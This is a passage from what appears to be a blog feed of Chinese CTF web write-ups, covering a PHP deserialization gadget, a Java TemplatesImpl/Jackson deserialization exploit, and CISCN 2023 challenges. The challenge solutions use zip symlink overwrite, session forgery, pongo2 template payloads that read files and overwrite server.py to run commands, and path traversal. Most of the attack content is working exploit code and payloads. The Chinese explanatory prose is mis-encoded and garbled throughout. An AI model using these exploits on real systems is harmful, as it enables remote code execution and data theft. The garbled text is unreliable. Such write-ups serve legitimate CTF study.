version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;image&gt;</span><br><span class="line">&lt;read filename=&quot;icc:/flag&quot;/&gt;</span><br><span class="line">&lt;write filename=&quot;/tmp/res&quot;/&gt;</span><br><span class="line">&lt;/image&gt;</span><br><span class="line">----------------------------322407393146894488301949--</span><br></pre></td></tr></table></figure><p>æœ€åè§¦å‘session_start</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fumo_backdoor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$argv</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fumo_backdoor</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;func = <span class="string">&quot;session_start&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;path = <span class="string">&quot;/tmp/res&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pCyrmSs"><img src="https://s1.ax1x.com/2023/07/05/pCyrmSs.png" alt="pCyrmSs.png"></a></p><h2 id="hellojava"><a href="#hellojava" class="headerlink" title="hellojava"></a>hellojava</h2><p>hello controlleréœ€ç»•è¿‡Jacksonæ³¨è§£ï¼Œè®¾ç½®ä¸ºç©ºå€¼å³å¯ï¼š<a href="https://blog.kuron3k0.vip/2021/04/10/vulns-of-misunderstanding-annotation/">è¯¯è§£æ³¨è§£äº§ç”Ÿçš„æ¼æ´ - kuron3k0çš„åšå®¢ | kuron3k0â€™s Blog</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;Base64Code&quot;:&quot;Eval&quot;,&quot;&quot;:true&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pCy5hB4"><img src="https://s1.ax1x.com/2023/07/05/pCy5hB4.png" alt="pCy5hB4.png"></a></p><p><a href="https://imgse.com/i/pCy4tL4"><img src="https://s1.ax1x.com/2023/07/05/pCy4tL4.png" alt="pCy4tL4.png"></a></p><p>çº¯å‡è¿‡æ»¤ï¼Œraspä¹Ÿæ²¡ç”¨ï¼Œå¯ä»¥aliyun bypass1ç›´æ¥æ‰“</p><p><strong>Exp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bypass_1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\BadClass\\Evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;aa&quot;</span>);</span><br><span class="line">        setValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,jsonNodes);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(badAttributeValueExpException);</span></span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(badAttributeValueExpException);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] output = Base64.getEncoder().encode(byteArrayOutputStream.toByteArray());</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(output));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        byte[] bytes1 = byteArrayOutputStream.toByteArray();</span></span><br><span class="line"><span class="comment">//        String s = Exp.base64Encode(bytes1);</span></span><br><span class="line"><span class="comment">//        System.out.println(s);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="keyword">return</span> encoder.encodeToString(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> oi.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è´´åˆé¢˜ç›®çš„ä¸€ç§åšæ³•åº”è¯¥æ˜¯ç”¨hessian-onlyjdk+scalaï¼ˆCVE-2022-36944ï¼‰<a href="https://github.com/yarocher/lazylist-cve-poc">https://github.com/yarocher/lazylist-cve-poc</a></p>]]></content>
      
      
      <categories>
          
          <category> competition </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> pin </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023 CISCN WEB</title>
      <link href="/2023/05/29/2023%20CISCN%20WEB/"/>
      <url>/2023/05/29/2023%20CISCN%20WEB/</url>
      
        <content type="html"><![CDATA[<h1 id="2023-CISCN-WEB"><a href="#2023-CISCN-WEB" class="headerlink" title="2023 CISCN WEB"></a>2023 CISCN WEB</h1><h2 id="unzip"><a href="#unzip" class="headerlink" title="unzip"></a>unzip</h2><p><strong>upload.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$finfo</span> = <span class="title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">finfo_file</span>(<span class="variable">$finfo</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]) === <span class="string">&#x27;application/zip&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ·±è‚²æ¯zipzip</p><p>ä»£ç å¾ˆç®€å•ï¼Œå°†ä¸Šä¼ çš„zipå‹ç¼©åˆ°&#x2F;tmpä¸‹ï¼Œå°±æ˜¯ä¸ªè½¯é“¾æ¥è¦†ç›–</p><p><a href="https://imgse.com/i/pC94Z4J"><img src="https://s1.ax1x.com/2023/06/04/pC94Z4J.png" alt="pC94Z4J.png"></a></p><p>ç„¶ååˆ†åˆ«ä¸Šä¼ shell.zipå’Œshell1.zipå°±è¡Œäº†</p><p><a href="https://imgse.com/i/pC940Df"><img src="https://s1.ax1x.com/2023/06/04/pC940Df.png" alt="pC940Df.png"></a></p><h2 id="go-session"><a href="#go-session" class="headerlink" title="go_session"></a>go_session</h2><p>ä¸‰ä¸ªè·¯ç”±</p><p>Index</p><p>Admin</p><p>Flask</p><p>Indexé‡Œå°±è¿›è¡Œäº†ä¸€ä¸ªsessionçš„èµ‹å€¼ï¼Œå…¶ä¸­keyè¿˜æ˜¯é€šè¿‡ç¯å¢ƒå˜é‡è·å–çš„</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> store = sessions.NewCookieStore([]<span class="type">byte</span>(os.Getenv(<span class="string">&quot;SESSION_KEY&quot;</span>)))</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pC9AYAU"><img src="https://s1.ax1x.com/2023/06/03/pC9AYAU.png" alt="pC9AYAU.png"></a></p><p>Adminè·¯ç”±éœ€è¦sessionä¸­nameä¸ºadminï¼Œæ ¡éªŒå®Œæˆåä½¿ç”¨pongo2è¿›è¡Œæ¨¡æ¿æ¸²æŸ“</p><p><a href="https://imgse.com/i/pC9AHUS"><img src="https://s1.ax1x.com/2023/06/03/pC9AHUS.png" alt="pC9AHUS.png"></a></p><p>Flaskè·¯ç”±æ˜¯ä¸€ä¸ªå¼€å¯debugçš„flaskæœåŠ¡ï¼Œç„¶åè¿”å›flaskæœåŠ¡é¡µé¢çš„å†…å®¹</p><p><a href="https://imgse.com/i/pC9AO3j"><img src="https://s1.ax1x.com/2023/06/03/pC9AO3j.png" alt="pC9AO3j.png"></a></p><p>é¦–å…ˆä¼ªé€ admin sessionï¼Œæµ‹è¯•å‘ç°SESSION_KEYä¸ºç©ºï¼Œæ‰€ä»¥æœ¬åœ°ç›´æ¥èµ·ä¸ªæœåŠ¡ä¼ªé€ å°±è¡Œ</p><p><strong>main.go</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gorilla/sessions&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> store = sessions.NewCookieStore([]<span class="type">byte</span>(os.Getenv(<span class="string">&quot;&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">router := gin.Default()</span><br><span class="line"></span><br><span class="line">router.GET(<span class="string">&quot;/&quot;</span>, Index)</span><br><span class="line"></span><br><span class="line">err := router.Run(<span class="string">&quot;:8080&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line">err = session.Save(c.Request, c.Writer)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.String(http.StatusOK, <span class="string">&quot;Hello, admin&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸‹é¢çœ‹pango2æ¸²æŸ“ï¼Œå¹¶ä¸èƒ½sstiï¼Œç¿»æ–‡æ¡£ï¼Œçœ‹åˆ°ä¸€å¥è¯ï¼Œpango2çš„æ¨¡æ¿è§„åˆ™å’ŒDjangoä¸€æ ·</p><p><a href="https://imgse.com/i/pC9Z0js"><img src="https://s1.ax1x.com/2023/06/03/pC9Z0js.png" alt="pC9Z0js.png"></a></p><p>é…åˆginæ¡†æ¶çš„<code>c.</code>å¯¹è±¡è°ƒç”¨çš„æ–¹å¼ï¼Œå¯æ„é€ å»ä»»æ„æ–‡ä»¶è¯»å–ï¼Œè®°å¾—urlç¼–ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin?name=%7B%25%20include%20c.Request.Header.Cmd%7Cfirst%20%25%7D</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pC905Md"><img src="https://s1.ax1x.com/2023/06/04/pC905Md.png" alt="pC905Md.png"></a></p><p><code>c.Request.Header.Cmd|first</code>æ˜¯pango2ä¸­ç‰¹æœ‰çš„ç”¨æ³•ï¼ŒPongo2ä¸­ä¸ç›´æŒè®¿é—®ç»“æ„ä½“å­—æ®µçš„è¯­æ³•ï¼Œä½¿ç”¨ c.Request.Header.Cmdæ˜¯æ— æ³•ç›´æ¥è·å–åˆ°Cmdçš„å€¼ã€‚å¿…é¡»ä½¿ç”¨firstè¿‡æ»¤å™¨è·å–è¯·æ±‚å¤´çš„å€¼ã€‚</p><p>å½“æ—¶å°±å»ç®—pinç äº†ï¼Œæœ€åpinç æˆåŠŸç®—å‡ºæ¥äº†ï¼Œä½†æ²¡æœ‰Cookieæ‰§è¡Œä¸äº†å‘½ä»¤</p><p>çœ‹åˆ°è¿˜å‰©ä¸€ä¸ªè·¯ç”±<code>/flask</code>ï¼Œå› ä¸ºå¼€äº†debugï¼Œå¯æŠ¥é”™å¾—åˆ°å…¶æºç </p><p><strong>server.py</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> name + <span class="string">&quot; no ssti&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;127.0.0.1&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>å¼€äº†debugï¼Œå¯ä»¥ä¸Šä¼ server.pyå»è¦†ç›–åŸæœ‰çš„server.pyï¼Œä»è€Œæ‰§è¡Œå‘½ä»¤ï¼Œåˆ©ç”¨ginçš„<code>c.SaveUploadedFile</code></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/admin?name=&#123;&#123;c.SaveUploadedFile(c.FormFile(c.Request.Header.File|first),c.Request.Header.Path|first)&#125;&#125;</span><br><span class="line"></span><br><span class="line">File: file</span><br><span class="line">Path: /app/server.py</span><br></pre></td></tr></table></figure><p><strong>server.py</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&#x27;ls / &gt; /tmp/1.txt&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> name + <span class="string">&quot; no ssti&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;127.0.0.1&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pC9fAMV"><img src="https://s1.ax1x.com/2023/06/04/pC9fAMV.png" alt="pC9fAMV.png"></a></p><p>ä¸Šä¼ æˆåŠŸåè¯»ä¸€ä¸‹</p><p><a href="https://imgse.com/i/pC9feZF"><img src="https://s1.ax1x.com/2023/06/04/pC9feZF.png" alt="pC9feZF.png"></a></p><p>æ‹¿åˆ°flagæ–‡ä»¶å</p><p><a href="https://imgse.com/i/pC9fma4"><img src="https://s1.ax1x.com/2023/06/04/pC9fma4.png" alt="pC9fma4.png"></a></p><p><a href="https://imgse.com/i/pC9fnIJ"><img src="https://s1.ax1x.com/2023/06/04/pC9fnIJ.png" alt="pC9fnIJ.png"></a></p><h2 id="reading"><a href="#reading" class="headerlink" title="reading"></a>reading</h2><p>&#x2F;booksè·¯ç”±ä»»æ„æ–‡ä»¶è¯»å–ï¼Œrerplaceæ‰äº†<code>../</code>ï¼ŒåŒå†™ä¸€ä¸‹å°±è¡Œäº†</p><p>è¯»å–<strong>server.py</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template, send_file</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = hashlib.md5(os.urandom(<span class="number">32</span>)).hexdigest()</span><br><span class="line">key = hashlib.md5(<span class="built_in">str</span>(time.time_ns()).encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">books = os.listdir(<span class="string">&#x27;./books&#x27;</span>)</span><br><span class="line">books.sort(reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> session:</span><br><span class="line">        book = session[<span class="string">&#x27;book&#x27;</span>]</span><br><span class="line">        page = session[<span class="string">&#x27;page&#x27;</span>]</span><br><span class="line">        page_size = session[<span class="string">&#x27;page_size&#x27;</span>]</span><br><span class="line">        total_pages = session[<span class="string">&#x27;total_pages&#x27;</span>]</span><br><span class="line">        filepath = session[<span class="string">&#x27;filepath&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        words = read_file_page(filepath, page, page_size)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, books=books, words=words)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, books=books )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span 